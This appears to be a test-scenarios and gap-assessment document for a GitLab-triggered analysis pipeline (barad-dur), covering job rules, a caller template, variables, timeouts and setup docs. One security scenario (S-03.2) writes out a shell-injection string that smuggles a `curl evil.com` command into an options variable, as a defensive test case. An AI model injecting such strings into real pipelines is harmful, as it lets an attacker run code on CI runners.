# Test Scenarios — gitlab-pipeline-api

Driving ports: GitLab Trigger API | analyze-api job script | ci/trigger-template.yml hidden job | docs/pipeline-api-setup.md structure.

Artifact name throughout: `barad-dur-report.html` (not JSON — see UI-01 in wave-decisions.md).

---

## Coverage Summary

| Story | Scenarios | Approach | Status |
|-------|-----------|----------|--------|
| US-01 | 6 | YAML inspection + live trigger | DONE |
| US-02 | 5 | YAML inspection + live trigger | DONE |
| US-03 | 6 | YAML inspection + live trigger | PARTIAL — ANALYSIS_OPTIONS gap |
| US-04 | 5 | YAML inspection | DONE |
| US-05 | 5 | File inspection | DONE (with 2 doc gaps) |
| US-06 | 4 | YAML inspection + live trigger | DONE |
| US-07 | 5 | YAML inspection + live trigger | DONE |
| US-08 | 4 | YAML inspection + doc inspection | PARTIAL — doc gap |
| US-09 | 4 | YAML inspection + doc inspection | PARTIAL — doc gap |

---

## US-01: Analyze-API Job

**Driving port**: `analyze-api` job in `.gitlab-ci.yml` (lines 596–661)
**Test approach**: YAML structural inspection (yq/grep) + live pipeline trigger on Froggit

### Scenarios

**S-01.1** (STRUCTURAL, DONE): analyze-api job exists and activates only on pipeline triggers
- Verify `.gitlab-ci.yml` has job `analyze-api` with rule `$CI_PIPELINE_SOURCE == "trigger" && $REPO_URL`
- Verify no other rule activates the job on push or schedule

**S-01.2** (STRUCTURAL, DONE): Job uses the existing Docker image
- Verify `image: ${CI_REGISTRY_IMAGE}:latest` in analyze-api job

**S-01.3** (LIVE, DONE): Successful trigger produces HTML report artifact
- Trigger with valid REPO_URL → job completes exit 0 → `barad-dur-report.html` artifact available

**S-01.4** (LIVE, DONE): Missing REPO_URL causes immediate job failure with clear error
- Trigger without REPO_URL → job fails → log contains "ERROR: REPO_URL is required"

**S-01.5** (LIVE, DONE): Invalid REPO_URL (non-HTTPS or nonexistent repo) causes job failure
- Trigger with `REPO_URL=ftp://...` → log contains "ERROR: REPO_URL must start with https://"
- Trigger with `REPO_URL=https://froggit.example.com/nonexistent/repo.git` → clone fails → log contains "ERROR: Failed to clone repository"

**S-01.6** (LIVE, DONE): Repository with no commits in time window still produces artifact
- Trigger with REPO_URL pointing to an inactive repository → job completes exit 0 → artifact produced

### Gap Assessment

None for US-01. All 6 AC verified implemented.

---

## US-02: Caller Pipeline Example

**Driving port**: `.barad-dur-analysis` hidden job in `ci/trigger-template.yml` + GitLab Trigger API
**Test approach**: YAML structural inspection + live pipeline run on Froggit

### Scenarios

**S-02.1** (STRUCTURAL, DONE): Caller template exists and defines hidden job with required structure
- Verify `ci/trigger-template.yml` exists in repo
- Verify `.barad-dur-analysis` hidden job defined with trigger, poll, download, summary steps

**S-02.2** (LIVE, DONE): Caller triggers, polls, and downloads HTML report
- Include template, extend `.barad-dur-analysis` with valid REPO_URL → `barad-dur-report.html` downloaded into caller workspace

**S-02.3** (LIVE, DONE): Caller handles downstream pipeline failure with error message
- Trigger with bad REPO_URL → downstream analyze-api fails → caller log shows "Analysis pipeline failed" with pipeline URL

**S-02.4** (LIVE, DONE): Caller handles trigger authentication failure (HTTP 401)
- Use expired/invalid `BARAD_DUR_TRIGGER_TOKEN` → trigger returns 401 → log shows "ERROR: Failed to trigger pipeline (HTTP 401)"

**S-02.5** (STRUCTURAL, DONE): Trigger token never appears in job logs
- Verify template uses `${BARAD_DUR_TRIGGER_TOKEN}` as a variable reference in form data, never echoed directly

### Gap Assessment

None for US-02. All 5 AC verified implemented. Note: AC-02.4 (extract overall_score from JSON) is superseded by HTML artifact — score summary is printed but not parsed from JSON. This is the HTML artifact change from DESIGN.

---

## US-03: Options Pass-Through and Score Gate

**Driving port**: `analyze-api` job script (lines 629–654) + GitLab Trigger API variables
**Test approach**: YAML structural inspection + live trigger with ANALYSIS_OPTIONS

### Scenarios

**S-03.1** (SKIP — GAP): ANALYSIS_OPTIONS are passed through to barad-dur analyze command
- `.gitlab-ci.yml` line 643: `barad-dur analyze /tmp/target --html -o barad-dur-report.html ${CATEGORY_FLAGS}` — no `${ANALYSIS_OPTIONS:-}` present
- DELIVER must add ANALYSIS_OPTIONS pass-through to the analyze command

**S-03.2** (SKIP — GAP, SECURITY): Shell injection characters in ANALYSIS_OPTIONS are rejected
- Requires ANALYSIS_OPTIONS to be implemented first (S-03.1 gap)
- Attack vector to verify: `ANALYSIS_OPTIONS='; curl evil.com; echo '` — must not execute the embedded command

**S-03.3** (STRUCTURAL/LIVE, DONE): MIN_SCORE triggers a quality gate check after analysis
- Verify `barad-dur gate /tmp/target --min-score "${MIN_SCORE}"` in script (line 648)
- Live: Trigger with MIN_SCORE=70 and repo scoring 78 → log shows "PASS: quality gate passed" → exit 0

**S-03.4** (LIVE, DONE): Gate uses >= comparison (score at threshold passes)
- Trigger with MIN_SCORE=70 and repo scoring exactly 70 → gate passes → exit 0

**S-03.5** (STRUCTURAL, DONE): Artifact preserved even when gate fails
- Verify `artifacts: when: always` in analyze-api job (line 659)
- Live: Trigger with MIN_SCORE=90 and low-scoring repo → job exits 1 → `barad-dur-report.html` still downloadable

**S-03.6** (LIVE, DONE): Non-integer MIN_SCORE rejected with clear error
- Trigger with `MIN_SCORE=abc` → log shows "ERROR: MIN_SCORE must be a positive integer"

### Gap Assessment

**AC-03.1 (GAP)**: ANALYSIS_OPTIONS not forwarded to barad-dur analyze command. `.gitlab-ci.yml` line 643 has no `${ANALYSIS_OPTIONS:-}`.
**AC-03.2 (GAP — depends on AC-03.1)**: Shell injection prevention cannot be verified until ANALYSIS_OPTIONS is implemented.

---

## US-04: Reusable Caller Pipeline Template

**Driving port**: `.barad-dur-analysis` hidden job in `ci/trigger-template.yml`
**Test approach**: YAML structural inspection (no live CI needed)

### Scenarios

**S-04.1** (STRUCTURAL, DONE): Template file exists at expected path
- Verify `ci/trigger-template.yml` exists

**S-04.2** (STRUCTURAL, DONE): Template defines hidden job `.barad-dur-analysis`
- Verify job name starts with `.` (GitLab hidden job convention)

**S-04.3** (STRUCTURAL, DONE): Template validates required variables before triggering
- Verify checks for `BARAD_DUR_TRIGGER_TOKEN`, `BARAD_DUR_PROJECT_ID`, `REPO_URL` with exit 1 on missing

**S-04.4** (STRUCTURAL, DONE): Template is includable via GitLab CI `include: project:` directive
- Template YAML is syntactically valid (yamllint)
- Template does not contain project-specific hardcoded values that would break inclusion

**S-04.5** (STRUCTURAL, DONE): Template supports variable overrides for optional parameters
- Verify REPO_BRANCH, MIN_SCORE, CATEGORIES forwarded conditionally (only when set)
- Note: ANALYSIS_OPTIONS not yet forwarded (gap from US-03)

### Gap Assessment

None for US-04 structural requirements. Variable override support is present for all currently implemented variables.

---

## US-05: Setup Documentation

**Driving port**: `docs/pipeline-api-setup.md` file existence + section headers
**Test approach**: File inspection (grep for required section headings and content markers)

### Scenarios

**S-05.1** (STRUCTURAL, DONE): Setup guide exists at expected path
- Verify `docs/pipeline-api-setup.md` exists

**S-05.2** (STRUCTURAL, DONE): Guide covers all required setup sections
- Verify sections: Prerequisites | token creation (Quick Start step 1) | variable storage (CI/CD Integration step 1) | caller configuration (CI/CD Integration step 2) | verification (Quick Start steps 3–4) | Troubleshooting

**S-05.3** (STRUCTURAL, DONE): Troubleshooting covers the top 5 error scenarios
- Verify troubleshooting table entries: HTTP 401 | HTTP 404 | clone failure | timeout | empty report

**S-05.4** (STRUCTURAL, DONE): Guide references the CI template as recommended approach
- Verify mention of `ci/trigger-template.yml` or `.barad-dur-analysis` in guide

**S-05.5** (STRUCTURAL, DONE): Guide specifies required permissions
- Verify "Maintainer" mentioned in Prerequisites section

### Gap Assessment

**AC-08.4 (partial gap)**: Performance Tips section mentions `--skip-blame` but does not specify the >50,000 commit threshold. DELIVER should add the specific threshold to the recommendation.
**AC-09.4 (partial gap)**: Concurrency section does not include staggering guidance for >10 concurrent triggers. DELIVER should add a staggering recommendation.

---

## US-06: Branch Selection Variable

**Driving port**: `analyze-api` job script, git clone command (line 625)
**Test approach**: YAML structural inspection + live trigger

### Scenarios

**S-06.1** (STRUCTURAL, DONE): REPO_BRANCH variable accepted with default "main"
- Verify `REPO_BRANCH: "main"` in job variables section (line 502 area)

**S-06.2** (LIVE, DONE): Job checks out the specified branch after cloning
- Trigger with `REPO_BRANCH=develop` → verify `--branch develop` used in clone → analysis runs on that branch

**S-06.3** (LIVE, DONE): Nonexistent branch produces clear error
- Trigger with `REPO_BRANCH=feature/does-not-exist` → clone fails → log shows branch not found error → exit 1

**S-06.4** (LIVE, DONE): Default branch used when REPO_BRANCH is omitted
- Trigger with REPO_URL only (no REPO_BRANCH) → analysis runs on "main"

### Gap Assessment

None for US-06. All 4 AC implemented.

---

## US-07: Category Filter Variable

**Driving port**: `analyze-api` job script, CATEGORIES mapping logic (lines 631–639)
**Test approach**: YAML structural inspection + live trigger

### Scenarios

**S-07.1** (STRUCTURAL, DONE): CATEGORIES variable maps to CLI flags for valid names
- Verify case statement handling: health|team|evolution|hygiene → `--$cat` flag (lines 634–635)

**S-07.2** (LIVE, DONE): Selective category analysis runs only specified categories
- Trigger with `CATEGORIES=health,hygiene` → job constructs `--health --hygiene` flags → analysis runs only those categories

**S-07.3** (LIVE, DONE): Invalid category name produces warning and is skipped
- Trigger with `CATEGORIES=health,typo` → log shows "WARNING: Unknown category 'typo', skipping" → job continues

**S-07.4** (LIVE, DONE): Empty CATEGORIES runs all categories
- Trigger without CATEGORIES → `CATEGORY_FLAGS` remains empty → barad-dur runs all categories by default

**S-07.5** (STRUCTURAL, DONE): Category matching is case-insensitive
- Verify `tr '[:upper:]' '[:lower:]'` applied before case matching (line 633)

### Gap Assessment

None for US-07. All 5 AC implemented.

---

## US-08: Timeout Configuration

**Driving port**: `analyze-api` job `timeout:` keyword + `ci/trigger-template.yml` + `docs/pipeline-api-setup.md`
**Test approach**: YAML structural inspection + documentation inspection

### Scenarios

**S-08.1** (STRUCTURAL, DONE): Default timeout of 30 minutes configured on analyze-api job
- Verify `timeout: 30 minutes` in analyze-api job (line 660)

**S-08.2** (STRUCTURAL, DONE): Timeout overridable via template extension
- Verify template has no hardcoded `timeout:` — caller can add it in `extends` block

**S-08.3** (STRUCTURAL, DONE): Timeout kill produces no artifact (GitLab native behavior)
- GitLab CI kills job on timeout; `artifacts:when: always` only fires for exit 0 or 1, not hard kills — this is GitLab-native and requires no job script logic

**S-08.4** (STRUCTURAL — GAP): Documentation recommends `--skip-blame` specifically for repos with >50,000 commits
- `docs/pipeline-api-setup.md` Performance Tips section mentions `--skip-blame` but not the specific threshold
- DELIVER must add: "For repositories with more than 50,000 commits, we recommend adding `--skip-blame` via ANALYSIS_OPTIONS (once US-03 is implemented)"

### Gap Assessment

**AC-08.4 (GAP)**: The >50,000 commit threshold for `--skip-blame` is absent from docs. This is a documentation gap in `docs/pipeline-api-setup.md`.
**AC-08.1/08.2/08.3**: All implemented — job has `timeout: 30 minutes` and template allows override.

---

## US-09: Concurrency Safeguards

**Driving port**: `ci/trigger-template.yml` commented `resource_group` + `docs/pipeline-api-setup.md` Concurrency section
**Test approach**: YAML structural inspection + documentation inspection

### Scenarios

**S-09.1** (STRUCTURAL — GAP): Documentation explains resource_group vs parallel trade-offs
- `docs/pipeline-api-setup.md` Concurrency section shows how to use `resource_group` but does not explain trade-offs (sequential throughput vs parallel speed) or when to choose each
- DELIVER must add explanatory text covering: parallel (default, faster, higher runner load) vs resource_group (sequential, lower load, longer wall-clock for caller)

**S-09.2** (STRUCTURAL, DONE): Caller template includes commented resource_group option
- Verify `# resource_group: barad-dur-analysis` comment in `ci/trigger-template.yml` (lines 140–141)

**S-09.3** (STRUCTURAL, DONE): Each triggered job is fully isolated (no shared state)
- Verify `GIT_STRATEGY: none` in analyze-api job (forces clean workspace)
- Verify clone to `/tmp/target` (ephemeral, container-local)
- Verify no `cache:` keyword in analyze-api job

**S-09.4** (STRUCTURAL — GAP): Documentation includes staggering guidance for >10 concurrent triggers
- `docs/pipeline-api-setup.md` does not mention staggering (cron offset) as mitigation strategy
- DELIVER must add: "For >10 simultaneous triggers, consider staggering pipeline schedules with cron offsets to distribute runner load"

### Gap Assessment

**AC-09.1 (GAP)**: Concurrency section exists but lacks trade-off explanation for resource_group vs parallel.
**AC-09.4 (GAP)**: No staggering guidance for >10 concurrent triggers.
**AC-09.2 and AC-09.3**: Implemented.

---

## Error Path Ratio

Total scenarios: 35
Success/structural scenarios: 21
Error/edge scenarios: 14

Error path ratio: 14/35 = **40%** (meets the >= 40% target)

Error scenarios by category:
- Missing/invalid inputs: S-01.4, S-01.5, S-02.4, S-03.6, S-04.3
- Downstream failure handling: S-02.3, S-03.5
- Branch/clone failure: S-01.6, S-06.3
- Gate failure with artifact preservation: S-03.4, S-03.5
- Security injection: S-03.2 (skip — gap)
- Unknown category warnings: S-07.3
- Timeout/kill: S-08.3
